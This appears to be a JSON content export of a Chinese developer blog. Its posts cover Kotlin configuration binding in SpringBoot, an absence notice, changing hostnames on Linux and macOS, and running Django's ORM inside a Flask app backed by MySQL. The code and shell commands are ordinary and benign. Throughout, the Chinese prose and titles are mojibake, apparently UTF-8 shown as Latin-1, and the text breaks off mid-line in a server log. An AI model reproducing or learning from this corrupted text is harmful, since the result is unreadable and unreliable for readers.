{"meta":{"title":"æ¹¿ç§‘æŠ€","subtitle":"Dancing With Tech","description":"","author":"Chaos John","url":"https://blog.chaosjohn.com","root":"/"},"pages":[],"posts":[{"title":"SpringBoot @ConfigurationProperties","slug":"SpringBoot-ConfigurationProperties","date":"2020-12-31T06:34:46.000Z","updated":"2023-10-17T02:45:27.000Z","comments":true,"path":"SpringBoot-ConfigurationProperties.html","link":"","permalink":"https://blog.chaosjohn.com/SpringBoot-ConfigurationProperties.html","excerpt":"","text":"æ¬¢è¿è½¬è½½ï¼Œä½†è¯·åœ¨å¼€å¤´æˆ–ç»“å°¾æ³¨æ˜åŸæ–‡å‡ºå¤„ã€blog.chaosjohn.comã€‘ èƒŒæ™¯SpringBoot + kotlin åœ¨ SpringBoot é¡¹ç›®ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸åœ¨é…ç½®æ–‡ä»¶application.properties æˆ– application.yml ä¸­å­˜æ”¾é…ç½®å‚æ•°ã€‚ ç½‘ä¸Šå¾ˆå°‘æœ‰ kotlin ç‰ˆæœ¬çš„ä½¿ç”¨æ•™ç¨‹/æ¡ˆä¾‹ï¼Œæ‰€ä»¥å°±æœ‰äº†æœ¬æ–‡ ç®€å•åœºæ™¯: @Valueå¦‚æœåªæ˜¯å¶å°”åœ¨ä¸šåŠ¡ä¸­è·å–ä¸€ä¸‹é…ç½®å€¼ï¼Œå¯ä»¥ä½¿ç”¨ @Value æ³¨è§£ 12@Value(value &#x3D; &quot;\\$&#123;server.port&#125;&quot;)lateinit var port: String éœ€è¦ç”¨çš„åœ°æ–¹ï¼Œè°ƒç”¨ port å˜é‡ç›´æ¥å°±èƒ½è®¿é—®é…ç½®æ–‡ä»¶ä¸­çš„ server.port å€¼ ä½¿ç”¨ @ConfigurationPropertiesç¯å¢ƒå‡†å¤‡: å¼€å¯ annotationProcessorå¦‚æœä¸å¼€å¯çš„è¯ï¼ŒIDEA åˆ™ä¼šæç¤ºæŠ¥é”™ Spring Boot Configuration Annotation Processor not configured æ‰€ä»¥ï¼Œåœ¨ build.gradle.kts æ–‡ä»¶çš„ dependencies å—é‡Œæ·»åŠ ä»¥ä¸‹è¡Œ 12345dependencies &#123; ... annotationProcessor(&quot;org.springframework.boot:spring-boot-configuration-processor&quot;) ...&#125; åœ¨ Preferences -&gt; Build, Execution, Deployment -&gt; Compiler -&gt; Annotation Processors ä¸­å°† Enable annotation processing å‹¾é€‰ä¸Š ç¤ºä¾‹ application.yml1234567891011121314151617181920server: port: 9090greeting: Hellogreetings: EN: Hello ES: Hola DE: Hallo CN: ä½ å¥½user: name: Chaos gender: male age: 21product: name: picture seller: chaos price: 12.3 weight: 2order: id: 1234d5 paid: true @ConfigurationProperties é…ç½® prefixå¦‚æœä¸æŒ‡å®š prefixï¼ŒIDEA ä¼šæç¤ºè­¦å‘Š Prefix must be specified å¯¹äº greetingï¼Œå®ƒçš„ prefix ä¸º ç©ºï¼Œä½†æ˜¯å¦‚æœæŒ‡å®šä¸º ç©ºå­—ç¬¦ä¸² çš„è¯ IDEA åˆä¼šæç¤ºæŠ¥é”™ Prefix must be non-empty æ‰€ä»¥å»ºè®®ä½¿ç”¨ å¤šçº§é…ç½®ï¼Œç±»ä¼¼äº 1234user: name: Chaos gender: male age: 21 å¯¹äº name/gender/ageï¼Œå…¶ prefix ä¸º user æ¿€æ´» @ConfigurationPropertiesä»¥ UserPropertiesç±» ä¸¾ä¾‹ï¼Œå‡è®¾å®ƒçš„åŒ…åä¸º com.chaosjohn.tutorial.configuration_propertyï¼Œå¦‚ä½•è®© Spring çŸ¥é“è¯¥ç±»çš„å­˜åœ¨å‘¢ï¼Ÿ æœ‰ä»¥ä¸‹å‡ ç§æ–¹æ³•ï¼š å¢åŠ æ³¨è§£ @ConfigurationPropertiesScan å¢åŠ æ³¨è§£ @EnableConfigurationProperties(value = [UserProperties::class]) åœ¨ç±»ä¸Šå¢åŠ æ³¨è§£ @Component åœ¨ @Configuration æ³¨è§£çš„ç±»å†…æ‰‹åŠ¨åˆ›å»º @Bean é‡‡ç”¨ class ä½œä¸º Properties ç±»1234567@ConfigurationProperties(prefix &#x3D; &quot;product&quot;)class ProductProperties &#123; lateinit var name: String var seller: String &#x3D; &quot;&quot; var price by Delegates.notNull&lt;Double&gt;() var weight: Int &#x3D; 0&#125; å‚æ•°å¯ä»¥ç»™å®šé»˜è®¤å€¼è¿›è¡Œåˆå§‹åŒ–ï¼Œä½†ç”Ÿæˆ Bean æ—¶ï¼Œä¼šè‡ªåŠ¨ä»é…ç½®æ–‡ä»¶è¯»å…¥å‚æ•°å€¼ï¼Œé™¤æ­¤ä»¥å¤–ï¼š å¯¹äºéåŸºæœ¬ç±»å‹ï¼Œå¯ä»¥ç”¨ lateinit æ¥å»¶è¿Ÿåˆå§‹åŒ– å¯¹äºåŸºæœ¬ç±»å‹ï¼ˆPrimitive Typeï¼Œæ¯”å¦‚ Int / Double / Booleanï¼‰ï¼Œå¯ä»¥é€‰ç”¨ by Delegates.notNull&lt;&gt;() é‡‡ç”¨ data class ä½œä¸º Properties ç±»1234567@ConstructorBinding@ConfigurationProperties(prefix &#x3D; &quot;user&quot;)data class UserProperties( var name: String, var gender: String, var age: Int) æ³¨æ„ï¼š @ConstructorBinding å¿…ä¸å¯å°‘ data class æ— æ³•æ‰‹åŠ¨ç”Ÿæˆ Bean ä½¿ç”¨ é€šè¿‡æ„é€ å‡½æ•°ä¼ å…¥ 1234@RestControllerclass Controller(val userProperties: UserProperties) &#123; ...&#125; é€šè¿‡æ³¨è§£ @Autowired æ³¨å…¥ 12345678@RestControllerclass Controller &#123; @Autowired lateinit var userProperties: UserProperties ...&#125; å…³äº JSR303 éªŒè¯äº²æµ‹æ— æ³•ç”¨äº data class ç¤ºä¾‹ä»£ç Github: ChaosJohn/SpringBootConfigurationProperty","categories":[],"tags":[{"name":"jvm","slug":"jvm","permalink":"https://blog.chaosjohn.com/tags/jvm/"},{"name":"java","slug":"java","permalink":"https://blog.chaosjohn.com/tags/java/"},{"name":"SpringBoot","slug":"SpringBoot","permalink":"https://blog.chaosjohn.com/tags/SpringBoot/"},{"name":"kotlin","slug":"kotlin","permalink":"https://blog.chaosjohn.com/tags/kotlin/"}]},{"title":"ç¼ºå¸­ä¸€å‘¨çš„è§£é‡Š","slug":"Explanation-of-absense-for-a-week","date":"2020-12-31T01:59:01.000Z","updated":"2023-10-17T02:45:27.000Z","comments":true,"path":"Explanation-of-absense-for-a-week.html","link":"","permalink":"https://blog.chaosjohn.com/Explanation-of-absense-for-a-week.html","excerpt":"","text":"æ¬¢è¿è½¬è½½ï¼Œä½†è¯·åœ¨å¼€å¤´æˆ–ç»“å°¾æ³¨æ˜åŸæ–‡å‡ºå¤„ã€blog.chaosjohn.comã€‘ ç¦»ä¸Šæ¬¡å†™æ–‡ç« ï¼Œå·²ç»è¿‡äº†ä¸€å‘¨æœ‰ä½™ï¼Œæœ‰å¿…è¦è¯´æ˜ä¸€ä¸‹ã€‚ ä¹‹å‰å‡ ä¹ä¸€å¤©ä¸€ç¯‡æ–‡ç« ï¼Œä¸€å‘¨ä¿åº•å…­ç¯‡ï¼Œè™½ç„¶å¾ˆæœ‰æˆå°±æ„Ÿï¼Œä½†æ˜¯æ²¡æƒ³åˆ°ä¼šé‚£ä¹ˆè´¹ç²¾åŠ›è´¹æ—¶é—´ï¼š ä¸€æ–¹é¢æ˜¯é€‰å–é¢˜æï¼Œé€‰å¤§äº†ï¼Œä¸æ˜¯ä¸€ç¯‡èƒ½å†™å®Œçš„ï¼Œé€‰å°äº†ï¼Œæ·±å…¥çš„ä¸å¤Ÿå½»åº•ã€‚ å¦ä¸€æ–¹é¢æ˜¯ä¸‹ç¬”ï¼Œå¾—è€ƒè™‘æªè¾ï¼Œå‘ˆç°æ ¼å¼ï¼Œæ®µè½å¸ƒå±€ å¾€å¾€ä¸€ç¯‡æ–‡ç« ï¼Œæœ€çŸ­çš„éšç¬”ä¹Ÿè¦ä¸€å°æ—¶æ‰èƒ½å†™å®Œã€‚ è€Œä¸”ç¬”è€…æœ‰æ—¶å€™åœ¨å†™æ–‡çš„æ—¶å€™å‘ç°è‡ªå·±çš„ç†è§£ä¸å¤Ÿé€å½»æˆ–ç†è§£æœ‰è¯¯ï¼Œè¿˜éœ€è¦é©¬ä¸Šå»æŸ¥é˜…å¤§é‡ç›¸å…³èµ„æ–™ç»™è‡ªå·±å……ç”µï¼Œç„¶åæ‰èƒ½ç»§ç»­è¡Œæ–‡ã€‚ ç¬”è€…æ˜¯æ ‡å‡†çš„ç†å·¥ç”·ï¼Œæ–‡ç¬”ç¡®å®ä¸å’‹åœ°ï¼Œå› è¯æ±‡é‡åŒ®ä¹ï¼Œå¯¼è‡´æªè¾çœŸçš„å¥½éš¾ï¼Œæƒ³æŠŠè‡ªå·±çš„æƒ³æ³•ç²¾å‡†çš„è¡¨è¾¾å‡ºæ¥ï¼Œå¤´å‘éƒ½å¿«æŠ“ç§ƒäº†ã€‚ æœ€åå¯¼è‡´ï¼Œå¾ˆå¤šæ–‡ç« ï¼Œä»ä¸‹ç­å°±å¼€å§‹è½ç¬”ï¼Œå¾—å†™äº”å…­ä¸ªå°æ—¶å†™åˆ°æ·±å¤œæ‰èƒ½å®šç¨¿å‘å¸ƒã€‚ ä¸å¹¸å°±è¿™ä¹ˆé™ä¸´äº†ï¼Œä»Šå¹´å¹´ä¸­å¥½ä¸å®¹æ˜“æ¶ˆé€€çš„å¹²çœ¼ç—‡åˆå·åœŸé‡æ¥äº†ï¼Œæ¯å¤©é†’ç€å°±æ˜¯ç—›è‹¦ã€‚ ä¼‘äº†ä¸€å‘¨æ²¡å†™æ–‡ï¼Œæ„Ÿè§‰å¹²çœ¼ç—‡å¥½å¤šäº†ã€‚è¿™å°±æ‰“ç®—é‡æ–°æ‹¾ç¬”ã€‚ ä¸€æ–¹é¢å¸Œæœ›è‡ªå·±çš„è¡Œæ–‡é€Ÿåº¦èƒ½å¤§å¹…åº¦æé«˜ï¼Œå¦ä¸€æ–¹é¢å¸Œæœ›è‡ªå·±çš„çœ¼ç›ç»™åŠ›ä¸€ç‚¹ã€‚ åŠ æ²¹ï¼","categories":[],"tags":[{"name":"life","slug":"life","permalink":"https://blog.chaosjohn.com/tags/life/"}]},{"title":"åœ¨ Linux å’Œ Mac ä¸Šæ›´æ”¹ hostname","slug":"Modify-hostname","date":"2020-12-21T13:26:22.000Z","updated":"2023-10-17T02:45:27.000Z","comments":true,"path":"Modify-hostname.html","link":"","permalink":"https://blog.chaosjohn.com/Modify-hostname.html","excerpt":"","text":"æ¬¢è¿è½¬è½½ï¼Œä½†è¯·åœ¨å¼€å¤´æˆ–ç»“å°¾æ³¨æ˜åŸæ–‡å‡ºå¤„ã€blog.chaosjohn.comã€‘ å‰è¨€çœ‹è¿‡æˆ‘æ–‡ç« çš„æœ‹å‹éƒ½å¯èƒ½å‘ç°ï¼Œä»æˆ‘çš„ç»ˆç«¯æˆªå›¾å¯ä»¥çœ‹å‡ºï¼Œæˆ‘ä½¿ç”¨çš„æ˜¯ oh-my-zshï¼Œå¹¶ä¸”å¯¹ RPROMPT è¿›è¡Œäº†è‡ªå®šä¹‰ ç¬”è€…è®¾ç½®çš„æ˜¯: æ—¥æœŸ + æ—¶é—´ + ä¸»æœºå(hostname) å› ä¸ºç¬”è€…æœ‰å¾ˆå¤šç”µè„‘ + è™šæ‹Ÿæœº + äº‘ä¸»æœºï¼Œæ‰€ä»¥åœ¨ç»ˆç«¯çš„å‘½ä»¤æç¤ºç¬¦æ˜¾ç¤º hostname å¯¹äºç¬”è€…å°±æ ¼å¤–é‡è¦ï¼Œå¯ä»¥æ–¹ä¾¿ç¬”è€…ä¸€ç›®äº†ç„¶çš„çŸ¥é“å½“å‰ç»ˆç«¯è¿æ¥çš„æ˜¯å“ªå°æœºå­ã€‚ å½“ç„¶ï¼Œå‰ææ˜¯ï¼Œæ¯å°æœºå­éƒ½è¦é¢„å…ˆè®¾å®š hostname è®¾å®šæ–¹æ³•é€šç”¨*nix ç³»ç»Ÿï¼ˆLinux &amp; macOS &amp; FreeBSD &amp; â€¦ï¼‰é€šç”¨çš„è®¾å®š hostname çš„æ–¹æ³•ä¸º 1# hostname &lt;NEW HOSTNAME&gt; Linuxå¦‚æœå®‰è£…äº† systemd çš„è¯ï¼Œå¯ä»¥å€ŸåŠ© hostnamectl æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹å®ƒçš„å¸®åŠ©ï¼š 123456789101112131415161718192021$ hostnamectl -hhostnamectl [OPTIONS...] COMMAND ...Query or change system hostname. -h --help Show this help --version Show package version --no-ask-password Do not prompt for password -H --host&#x3D;[USER@]HOST Operate on remote host -M --machine&#x3D;CONTAINER Operate on local container --transient Only set transient hostname --static Only set static hostname --pretty Only set pretty hostnameCommands: status Show current hostname settings set-hostname NAME Set system hostname set-icon-name NAME Set icon name for host set-chassis NAME Set chassis type for host set-deployment NAME Set deployment environment for host set-location NAME Set location for host æ‰€ä»¥æˆ‘ä»¬è®¾å®š hostnameï¼Œå¯ä»¥ç”¨ï¼š 1# hostnamectl set-hostname &lt;NEW HOSTNAME&gt; macOSmacOS çš„è¯ï¼Œè¿˜å¯ä»¥å€ŸåŠ©äº scutil çœ‹ä¸€ä¸‹å¸®åŠ©ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142$ scutil --helpusage: scutil interactive access to the dynamic store. or: scutil --prefs [preference-file] interactive access to the [raw] stored preferences. or: scutil [-W] -r nodename or: scutil [-W] -r address or: scutil [-W] -r local-address remote-address check reachability of node, address, or address pair (-W to &quot;watch&quot;). or: scutil -w dynamic-store-key [ -t timeout ] -w wait for presense of dynamic store key -t time to wait for key or: scutil --get pref or: scutil --set pref [newval] or: scutil --get filename path key pref display (or set) the specified preference. Valid preferences include: ComputerName, LocalHostName, HostName newval New preference value to be set. If not specified, the new value will be read from standard input. or: scutil --dns show DNS configuration. or: scutil --proxy show &quot;proxy&quot; configuration. or: scutil --nwi show network information or: scutil --nc show VPN network configuration information. Use --nc help for full command list or: scutil --allow-new-interfaces [off|on] manage new interface creation with screen locked. or: scutil --error err# display a descriptive message for the given error code æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œscutil å¯ä»¥è®¾ç½® ComputerName / LocalHostName / HostNameã€‚é‚£ä¸‰è€…æœ‰ä»€ä¹ˆåŒºåˆ«å‘¢ï¼Ÿ ComputerNameï¼šç”µè„‘åç§°ï¼Œå¦‚æœç”¨è¿‡ Time Machine çš„è¯ï¼Œå¯ä»¥åœ¨å…¶å¤‡ä»½æ–‡ä»¶å¤¹å†…çœ‹åˆ°ä»¥ ComputerName.backupbundle å‘½åçš„æ–‡ä»¶ï¼Œå…¶å­˜çš„å°±æ˜¯å¯¹åº”ç”µè„‘çš„å†å²å¤‡ä»½ LocalHostNameï¼šå±€åŸŸç½‘(Bonjour)å†…å¯¹å¤–å®£å‘Šçš„ä¸»æœºåï¼Œä¾‹å¦‚ machine007.localï¼Œåˆ™å±€åŸŸç½‘å†…å…¶ä»–æœºå­ï¼Œå¯ä»¥é€šè¿‡ machine007.local ç›´æ¥è§£æå‡ºå±€åŸŸç½‘IPï¼Œè¿›è€Œç›´æ¥è®¿é—®åˆ°æœ¬æœº HostNameï¼šé€šå¸¸æ˜¯ LocalHostName å»é™¤å°¾éƒ¨çš„ .localï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬è¦è®¾å®šçš„ hostname æ‰€ä»¥æˆ‘ä»¬è®¾å®š hostnameï¼Œå¯ä»¥ç”¨ï¼š 1# scutil --set HostName &lt;NEW HOSTNAME&gt; æœ€åï¼Œå¦‚æœè¯¥æ–‡å¯¹è¯»è€…æœ‰äº›è®¸å¸®åŠ©ï¼Œè€ƒè™‘ä¸‹ç»™ç‚¹æåŠ©é¼“åŠ±ä¸€ä¸‹å‘—ğŸ˜Š","categories":[],"tags":[{"name":"OS X & macOS","slug":"OS-X-macOS","permalink":"https://blog.chaosjohn.com/tags/OS-X-macOS/"},{"name":"shell","slug":"shell","permalink":"https://blog.chaosjohn.com/tags/shell/"},{"name":"Linux","slug":"Linux","permalink":"https://blog.chaosjohn.com/tags/Linux/"},{"name":"hostname","slug":"hostname","permalink":"https://blog.chaosjohn.com/tags/hostname/"}]},{"title":"åœ¨ Flask ä¸­é›†æˆ Django çš„ ORM æ¨¡å—","slug":"Flask-with-Django-ORM","date":"2020-12-18T10:16:47.000Z","updated":"2023-10-17T02:45:27.000Z","comments":true,"path":"Flask-with-Django-ORM.html","link":"","permalink":"https://blog.chaosjohn.com/Flask-with-Django-ORM.html","excerpt":"","text":"æ¬¢è¿è½¬è½½ï¼Œä½†è¯·åœ¨å¼€å¤´æˆ–ç»“å°¾æ³¨æ˜åŸæ–‡å‡ºå¤„ã€blog.chaosjohn.comã€‘ å‰è¨€Django å’Œ Flask æ˜¯ç¬”è€…æœ€å–œæ¬¢çš„ä¸¤ä¸ª Python Web æ¡†æ¶ï¼Œä½†ä¸¤è€…å®šä½æˆªç„¶ä¸åŒ Django -&gt; â€œMore is lessâ€: æ˜¯ â€œå¤§è€Œå…¨â€ çš„é‡é‡çº§ Web æ¡†æ¶ï¼Œå…¶è‡ªå¸¦å¤§é‡çš„å¸¸ç”¨å·¥å…·å’Œç»„ä»¶ï¼ˆæ¯”å¦‚æ•°æ®åº“ORMç»„ä»¶ã€ç”¨æˆ·è®¤è¯ã€æƒé™ç®¡ç†ã€åˆ†é¡µã€ç¼“å­˜), ç”šè‡³è¿˜è‡ªå¸¦äº†ç®¡ç†åå°Adminï¼Œé€‚åˆå¿«é€Ÿå¼€å‘åŠŸèƒ½å®Œå–„çš„ä¼ä¸šçº§ç½‘ç«™ Flask -&gt; â€œLess is moreâ€: æ˜¯ä¸€ä¸ªè½»ä¾¿çµæ´»åˆæ˜“äºæ‰©å±•çš„ â€œå¾®â€ æ¡†æ¶ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼ŒDjango è‡ªå¸¦çš„é‚£äº›å·¥å…·å’Œç»„ä»¶ï¼ŒFlask é€šé€šéƒ½æ²¡æœ‰ï¼Œåªæä¾›ä¸€ä¸ªéå¸¸ç®€æ´é«˜æ•ˆçš„ â€œè·¯ç”±ç»„ä»¶â€ å¹³æ—¥é‡Œï¼Œåšäº›å°å·¥å…·å°åº”ç”¨å•¥çš„ï¼Œç¬”è€…è¿˜æ˜¯æ¯”è¾ƒå–œæ¬¢ Flask çš„ï¼Œå€ŸåŠ©è¿™æ ·å°å·§çš„å¾®æ¡†æ¶ï¼Œæ•°ååˆ†é’Ÿå°±èƒ½æ’¸ä¸€ä¸ªå‡ºæ¥ã€‚ ä½†æ˜¯ä¸Šå‡åˆ°å†™æ¯”è¾ƒåå¤§å‹ä¸€ç‚¹çš„åº”ç”¨ï¼Œç¬”è€…ä¸€èˆ¬é€‰æ‹©çš„éƒ½æ˜¯ Djangoã€‚æœ€ä¸»è¦çš„åŸå› æ— éå°±æ˜¯ï¼šå®ƒçš„ ORM æ¨¡å—å®åœ¨å¤ªå¥½ç”¨äº†ã€‚ è€Œåœ¨ Flask ä¸­ï¼Œç”¨çš„æœ€å¤š ORM æ¡†æ¶çš„è¿˜æ˜¯ SQLAlchemyï¼Œä½†æ˜¯ä¸ªäººæ„Ÿè§‰å…¶å‹å¥½ç¨‹åº¦æ¯”ä¸ä¸Š DjangoORMã€‚ æ‰€ä»¥ç¬”è€…èŒç”Ÿäº†ä¸€ä¸ªæƒ³æ³•ï¼šFlask + DjangoORM å¼€å·¥æ‰‹åŠ¨åˆ›å»ºé¡¹ç›®1$ mkdir FlaskWithDjangoORM ç”¨ pip å®‰è£…æ‰€éœ€ä¾èµ–åº“1$ pip install flask django mysqlclient æ‰‹åŠ¨åˆ›å»º app åº”ç”¨åœ¨æ ‡å‡†çš„ Django é¡¹ç›®ä¸­ï¼Œåˆ›å»ºåä¸º app çš„å­åº”ç”¨ï¼Œç”¨åˆ°çš„å‘½ä»¤ä¸º $ python manage.py startapp appï¼Œè¯¥å‘½ä»¤ç”Ÿæˆçš„å­åº”ç”¨å…¶ç›®å½•ä¸‹ï¼Œä¸€èˆ¬ä¼šæœ‰è¿™ä¹ˆå‡ ä¸ªæ–‡ä»¶/ç›®å½•ï¼š migrations/ è¯¥ç›®å½•å­˜æ”¾æ•°æ®åº“è¿ç§»æ–‡ä»¶ admin.py è¯¥æ–‡ä»¶ä¸ç®¡ç†åå°ç›¸å…³ apps.py è¯¥æ–‡ä»¶ä¸å­åº”ç”¨è®¾ç½®ç›¸å…³ models.py è¯¥æ–‡ä»¶å­˜æ”¾æ•°æ®åº“æ¨¡å‹ tests.py è¯¥æ–‡ä»¶å­˜æ”¾å•å…ƒæµ‹è¯• views.py è¯¥æ–‡ä»¶å­˜æ”¾è§†å›¾å±‚ä»£ç  ä½†å¦‚æœæˆ‘ä»¬åªç”¨ Django çš„ ORM æ¨¡å—çš„è¯ï¼Œé‚£ä¹ˆåªéœ€ç•™ä¸‹ migrations/ å’Œ models.pyã€‚æ•…å¼ƒç”¨å‘½ä»¤ï¼Œæ‰‹åŠ¨åˆ›å»ºä¹‹ï¼š 123$ cd FlaskWithDjangoORM$ mkdir -p app&#x2F;migrations$ touch app&#x2F;migrations&#x2F;__init__.py app å­åº”ç”¨åˆå§‹åŒ– 123456789$ cat &gt;&gt; app&#x2F;__init__.py &lt;&lt;EOFimport osfrom django.apps import appsfrom django.conf import settingsos.environ.setdefault(&quot;DJANGO_SETTINGS_MODULE&quot;, &quot;settings&quot;)apps.populate(settings.INSTALLED_APPS)EOF åˆ›å»ºæ•°æ®æ¨¡å‹ Visitï¼Œè®°å½•æ¯ä¸€æ¬¡ Web è¯·æ±‚è®¿é—®çš„æ—¶é—´ 123456$ cat &gt;&gt; app&#x2F;models.py &lt;&lt;EOFfrom django.db import modelsclass Visit(models.Model): created_at &#x3D; models.DateTimeField(auto_now_add&#x3D;True, null&#x3D;True)EOF åœ¨ settings.py å†…é…ç½®æ•°æ®åº“è¿æ¥ï¼ˆæœ¬æ–‡ç¤ºä¾‹é‡‡ç”¨ MySQLï¼‰12345678910111213141516171819202122$ cat &gt;&gt; settings.py &lt;&lt;EOFDATABASES &#x3D; &#123; &#39;default&#39;: &#123; &#39;ENGINE&#39;: &#39;django.db.backends.mysql&#39;, &#39;NAME&#39;: &#39;flask-with-django-orm-sample&#39;, &#39;USER&#39;: &#39;USERNAME&#39;, &#39;PASSWORD&#39;: &#39;PASSWORD&#39;, &#39;HOST&#39;: &#39;DATA_BASE_HOST&#39;, &#39;PORT&#39;: &#39;3306&#39;, &#39;OPTIONS&#39;: &#123; &#39;charset&#39;: &#39;utf8mb4&#39;, # https:&#x2F;&#x2F;django-mysql.readthedocs.io&#x2F;en&#x2F;latest&#x2F;checks.html#django-mysql-w002-innodb-strict-mode &#39;init_command&#39;: &quot;SET sql_mode&#x3D;&#39;STRICT_TRANS_TABLES&#39;, innodb_strict_mode&#x3D;1&quot;, &#125;, &#125;&#125;INSTALLED_APPS &#x3D; (&#39;app&#39;,)SECRET_KEY &#x3D; &#39;SOME_SECRET_KEY&#39;EOF é…ç½® manage.py ç®¡ç†å·¥å…·è¿™é‡Œä» æ ‡å‡†çš„ Django é¡¹ç›®ä¸­æ¬è¿è¿‡æ¥ï¼ˆéœ€ç•¥æ”¹ setdefault çš„å‚æ•°ï¼‰ 1234567891011121314151617181920212223$ cat &gt;&gt; manage.py &lt;&lt;EOF#!&#x2F;usr&#x2F;bin&#x2F;env python&quot;&quot;&quot;Django&#39;s command-line utility for administrative tasks.&quot;&quot;&quot;import osimport sysdef main(): os.environ.setdefault(&#39;DJANGO_SETTINGS_MODULE&#39;, &#39;settings&#39;) try: from django.core.management import execute_from_command_line except ImportError as exc: raise ImportError( &quot;Couldn&#39;t import Django. Are you sure it&#39;s installed and &quot; &quot;available on your PYTHONPATH environment variable? Did you &quot; &quot;forget to activate a virtual environment?&quot; ) from exc execute_from_command_line(sys.argv)if __name__ &#x3D;&#x3D; &#39;__main__&#39;: main()EOF è‡³æ­¤ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹ç›®å½•ç»“æ„ï¼š 12345678.â”œâ”€â”€ appâ”‚ â”œâ”€â”€ __init__.pyâ”‚ â”œâ”€â”€ migrationsâ”‚ â”‚ â””â”€â”€ __init__.pyâ”‚ â””â”€â”€ models.pyâ”œâ”€â”€ manage.pyâ””â”€â”€ settings.py ä»…è¿™äº›æ–‡ä»¶ï¼Œå·²ç»è¶³ä»¥æ»¡è¶³ Django ORM è¿è¡Œçš„å…¨éƒ¨æ‰€éœ€ å°†æœ¬åœ°æ•°æ®æ¨¡å‹åŒæ­¥åˆ°æ•°æ®åº“åˆ›å»ºè¿ç§»æ–‡ä»¶ 1234$ python manage.py makemigrationsMigrations for &#39;app&#39;: app&#x2F;migrations&#x2F;0001_initial.py - Create model Visit æ‰§è¡Œè¿ç§» 12345$ python manage.py migrateOperations to perform: Apply all migrations: appRunning migrations: Applying app.0001_initial... OK æŸ¥çœ‹ä¸€ä¸‹æ•°æ®åº“ 123456789mysql&gt; show databases;+------------------------------+| Database |+------------------------------+| flask-with-django-orm-sample || information_schema || mysql |+------------------------------+3 rows in set (1.23 sec) é€‰æ‹©æ•°æ®åº“å¹¶ç½—åˆ—æ‰€æœ‰æ•°æ®åº“è¡¨ 1234567891011mysql&gt; use flask-with-django-orm-sample;Database changedmysql&gt; show tables;+----------------------------------------+| Tables_in_flask-with-django-orm-sample |+----------------------------------------+| app_visit || django_migrations |+----------------------------------------+2 rows in set (0.04 sec) æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªè¿ç§»è¡¨ django_migrationsï¼Œè®°å½•çš„æ˜¯æ•°æ®æ¨¡å‹å˜æ›´è¿ç§»çš„æ‰€æœ‰è®°å½•ã€‚ æˆ‘ä»¬æŸ¥è¯¢ä¸€ä¸‹è¯¥è¡¨ï¼Œå¯ä»¥çœ‹åˆ°å·²å­˜åœ¨ 0001_initial è¿™æ¡è®°å½•ï¼Œä¸ä¹‹å‰è¿è¡Œ makemigrations æ‰€ç”Ÿæˆçš„è¿ç§»æ–‡ä»¶ app/migrations/0001_initial.py ç›¸å»åˆ 1234567mysql&gt; select * from django_migrations;+----+-----+--------------+----------------------------+| id | app | name | applied |+----+-----+--------------+----------------------------+| 1 | app | 0001_initial | 2020-12-20 08:01:16.618904 |+----+-----+--------------+----------------------------+1 row in set (0.22 sec) çœ‹ä¸€ä¸‹ app_visit è¡¨ç»“æ„ï¼Œä¸æˆ‘ä»¬åœ¨ app/models.py é‡Œå®šä¹‰çš„ Visit ç›¸å»åˆï¼ˆDjango ORM é»˜è®¤åˆ›å»ºçš„è¡¨åä¸º å­åº”ç”¨å_æ•°æ®æ¨¡å‹ç±»åï¼‰ 12345678mysql&gt; desc app_visit;+------------+-------------+------+-----+---------+----------------+| Field | Type | Null | Key | Default | Extra |+------------+-------------+------+-----+---------+----------------+| id | int(11) | NO | PRI | NULL | auto_increment || created_at | datetime(6) | YES | | NULL | |+------------+-------------+------+-----+---------+----------------+2 rows in set (0.25 sec) åˆ›å»º server.py ä½œä¸º flask çš„ä¸»æ–‡ä»¶1234567891011121314151617$ cat &gt;&gt; server.py &lt;&lt;EOFfrom flask import Flaskfrom app.models import Visitapp &#x3D; Flask(__name__)@app.route(&quot;&#x2F;&quot;)def index(): Visit.objects.create() return str(Visit.objects.count())if __name__ &#x3D;&#x3D; &#39;__main__&#39;: app.run()EOF å°† server.py è¿è¡Œèµ·æ¥ 1234567$ python server.py* Serving Flask app &quot;server&quot; (lazy loading) * Environment: production WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead. * Debug mode: off * Running on http:&#x2F;&#x2F;127.0.0.1:5000&#x2F; (Press CTRL+C to quit) æµ‹è¯•æ•ˆæœåœ¨æ–°ç»ˆç«¯å¤šæ¬¡è®¿é—® localhost:5000/ï¼Œå¯ä»¥çœ‹åˆ°è¿”å›ä» 1 å¼€å§‹ä¾æ¬¡é€’å¢ æŸ¥çœ‹ä¸‹ç¨‹åºæ—¥å¿— 12345678910111213141516171819 * Running on http:&#x2F;&#x2F;127.0.0.1:5000&#x2F; (Press CTRL+C to quit)127.0.0.1 - - [20&#x2F;Dec&#x2F;2020 09:52:56] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 -127.0.0.1 - - [20&#x2F;Dec&#x2F;2020 09:52:58] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 -127.0.0.1 - - [20&#x2F;Dec&#x2F;2020 09:53:00] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 -127.0.0.1 - - [20&#x2F;Dec&#x2F;2020 09:53:01] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 -127.0.0.1 - - [20&#x2F;Dec&#x2F;2020 09:53:03] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 -127.0.0.1 - - [20&#x2F;Dec&#x2F;2020 09:53:04] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 -127.0.0.1 - - [20&#x2F;Dec&#x2F;2020 09:53:05] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 -127.0.0.1 - - [20&#x2F;Dec&#x2F;2020 09:53:06] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 -127.0.0.1 - - [20&#x2F;Dec&#x2F;2020 09:53:07] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 -127.0.0.1 - - [20&#x2F;Dec&#x2F;2020 09:53:08] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 -127.0.0.1 - - [20&#x2F;Dec&#x2F;2020 09:53:12] &quot;GET 